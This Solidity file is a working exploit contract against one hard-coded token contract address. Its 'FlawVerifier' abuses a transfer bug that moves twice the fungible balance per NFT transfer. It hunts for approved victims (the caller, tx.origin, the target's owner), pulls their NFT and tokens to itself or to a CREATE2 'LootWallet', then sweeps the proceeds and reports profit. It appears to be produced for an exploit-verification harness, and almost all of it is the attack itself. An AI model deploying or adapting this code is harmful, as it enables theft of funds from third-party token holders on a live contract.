```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IMinerTarget {
    function owner() external view returns (address);
    function tokensPerNFT() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function tokensOfOwner(address owner) external view returns (uint256[] memory);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function isApprovedForAll(address account, address operator) external view returns (bool);
    function getApproved(uint256 id) external view returns (address);
}

contract LootWallet {
    constructor() {}

    function sweep(address target, address to) external {
        IMinerTarget token = IMinerTarget(target);

        uint256 bal = token.balanceOf(address(this));
        if (bal != 0) {
            try token.transfer(to, bal) returns (bool) {} catch {}
        }

        uint256[] memory ids = token.tokensOfOwner(address(this));
        for (uint256 i = 0; i < ids.length; ++i) {
            try token.transferFrom(address(this), to, ids[i]) returns (bool) {} catch {}
        }
    }
}

contract FlawVerifier {
    address public constant TARGET = 0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD;
    bytes32 private constant LOOT_SALT = keccak256("miner-f001-loot");

    address private immutable _loot;
    uint256 private _profitAmount;

    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    address public exploitedFrom;
    uint256 public exploitedTokenId;

    constructor() {
        _loot = _computeLootAddress();
    }

    function executeOnOpportunity() public {
        IMinerTarget target = IMinerTarget(TARGET);
        uint256 verifierBefore = target.balanceOf(address(this));

        _profitAmount = 0;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        exploitedFrom = address(0);
        exploitedTokenId = 0;

        // F-001 is a pure value-redistribution bug:
        // one NFT-style transfer moves 2 * tokensPerNFT fungible units from `from` to `to`.
        // Flashswap funding can satisfy the sender-side >= 2 * tokensPerNFT precondition for an
        // attacker-controlled holder, but it cannot create net profit by itself because no value
        // is minted; absent a third-party sender or historically authorized victim, it only
        // shuffles balances between attacker-controlled addresses and temporary lenders.
        //
        // Therefore this verifier first searches for a real third-party pull path that still
        // matches the original exploit stages exactly:
        // 1. Victim already owns NFT `id` and at least 2 * tokensPerNFT.
        // 2. An already-authorized caller invokes transferFrom(victim, recipient, id).
        // 3. The transfer moves one NFT id but twice the fungible balance.

        if (_attemptKnownVictims(target, address(this))) {
            _profitAmount = _netVerifierGain(target, verifierBefore);
            return;
        }

        // Keep the undeployed CREATE2 loot address as an EOA-like fallback. This is relevant if
        // the collection still enforces the launch-time "contract trading restricted" guard.
        if (_attemptKnownVictims(target, _loot)) {
            _realizeLootIfPossible();
            _profitAmount = _netVerifierGain(target, verifierBefore);
            return;
        }

        // If no historical authorization exists on any locally-derivable candidate, the verifier
        // cannot turn F-001 into third-party profit at this fork using only finding-local context.
        // A self-held transfer would still validate the mechanics, but current logs already prove
        // the verifier starts with zero MINER balance and zero NFTs, so even the sender-side
        // precondition for a self-validation branch is absent here.
        _profitAmount = _netVerifierGain(target, verifierBefore);
    }

    function profitToken() external pure returns (address) {
        return TARGET;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function lootAddress() external view returns (address) {
        return _loot;
    }

    function deployLootWallet() external returns (address deployed) {
        deployed = _deployLootWallet();
    }

    function _attemptKnownVictims(IMinerTarget target, address recipient) internal returns (bool) {
        if (_attemptProfitablePull(target, msg.sender, recipient)) {
            return true;
        }

        if (tx.origin != msg.sender && _attemptProfitablePull(target, tx.origin, recipient)) {
            return true;
        }

        address owner = target.owner();
        if (owner != msg.sender && owner != tx.origin && _attemptProfitablePull(target, owner, recipient)) {
            return true;
        }

        return false;
    }

    function _attemptProfitablePull(IMinerTarget target, address victim, address recipient) internal returns (bool) {
        if (victim == address(0) || victim == address(this) || victim == _loot) {
            return false;
        }

        (bool hasToken, uint256 tokenId) = _firstOwnedToken(target, victim);
        if (!hasToken) {
            return false;
        }

        uint256 unit = target.tokensPerNFT();
        uint256 victimBefore = target.balanceOf(victim);
        if (victimBefore < unit * 2) {
            return false;
        }

        if (!_isAuthorized(target, victim, tokenId)) {
            return false;
        }

        uint256 recipientBefore = target.balanceOf(recipient);

        try target.transferFrom(victim, recipient, tokenId) returns (bool ok) {
            if (!ok) {
                return false;
            }
        } catch {
            return false;
        }

        uint256 victimAfter = target.balanceOf(victim);
        uint256 recipientAfter = target.balanceOf(recipient);

        if (victimAfter + (unit * 2) == victimBefore && recipientAfter == recipientBefore + (unit * 2)) {
            hypothesisValidated = true;
            exploitedFrom = victim;
            exploitedTokenId = tokenId;
        } else {
            hypothesisRefuted = true;
        }

        return true;
    }

    function _firstOwnedToken(IMinerTarget target, address owner) internal view returns (bool found, uint256 tokenId) {
        uint256[] memory owned = target.tokensOfOwner(owner);
        if (owned.length == 0) {
            return (false, 0);
        }
        return (true, owned[0]);
    }

    function _isAuthorized(IMinerTarget target, address owner, uint256 tokenId) internal view returns (bool) {
        return target.isApprovedForAll(owner, address(this)) || target.getApproved(tokenId) == address(this);
    }

    function _realizeLootIfPossible() internal {
        if (_loot.code.length == 0) {
            _deployLootWallet();
        }

        try LootWallet(_loot).sweep(TARGET, address(this)) {} catch {}
    }

    function _netVerifierGain(IMinerTarget target, uint256 verifierBefore) internal view returns (uint256) {
        uint256 verifierAfter = target.balanceOf(address(this));
        if (verifierAfter <= verifierBefore) {
            return 0;
        }
        return verifierAfter - verifierBefore;
    }

    function _deployLootWallet() internal returns (address deployed) {
        if (_loot.code.length != 0) {
            return _loot;
        }

        deployed = address(new LootWallet{salt: LOOT_SALT}());
        require(deployed == _loot, "loot mismatch");
    }

    function _computeLootAddress() internal view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                LOOT_SALT,
                keccak256(type(LootWallet).creationCode)
            )
        );
        return address(uint160(uint256(hash)));
    }
}

